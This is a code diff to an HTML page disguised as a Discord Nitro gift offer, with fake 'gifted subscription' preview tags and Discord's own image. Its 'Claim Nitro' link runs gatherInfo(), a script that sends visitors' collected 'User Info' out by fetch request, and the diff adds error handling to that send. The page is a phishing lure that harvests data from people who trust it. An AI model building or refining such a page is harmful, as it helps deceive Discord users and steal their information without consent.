@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta property="og:title" content="You've been gifted a subscription!">
     <meta property="og:description" content="Friend has gifted you Nitro for 1 month">
-    <meta property="og:image" content="https://support.discord.com/hc/user_images/wDgPSdKaHV9lUSR2nMko8A.png">
-    <meta property="og:url" content="https://inukedyou1.github.io/nitro-offer">
+    <meta property="og:image" content="https://example.com/nitro-image.png">
+    <meta property="og:url" content="https://your-github-username.github.io/nitro-offer">
     <title>Discord Nitro Offer</title>
     <style>
         body {
@@ -29,7 +29,7 @@
 </head>
 <body>
     <h1>Claim Your Free Discord Nitro!</h1>
-    <img src="https://example.com/nitro-image.png" alt="Discord Nitro" class="nitro-img">
+    <img src="https://support.discord.com/hc/user_images/wDgPSdKaHV9lUSR2nMko8A.png" alt="Discord Nitro" class="nitro-img">
     <p>Click the link below to claim your free Discord Nitro:</p>
     <a class="nitro-link" onclick="gatherInfo()">Claim Nitro</a>
 
@@ -71,7 +71,13 @@
                     content: `User Info: ${JSON.stringify(userInfo)}`
                 })
             })
-            .then(response => console.log('Success:', response))
+            .then(response => {
+                if (response.ok) {
+                    console.log('Success:', response);
+                } else {
+                    console.error('Error:', response.statusText);
+                }
+            })
             .catch((error) => console.error('Error:', error));
         }
     </script>
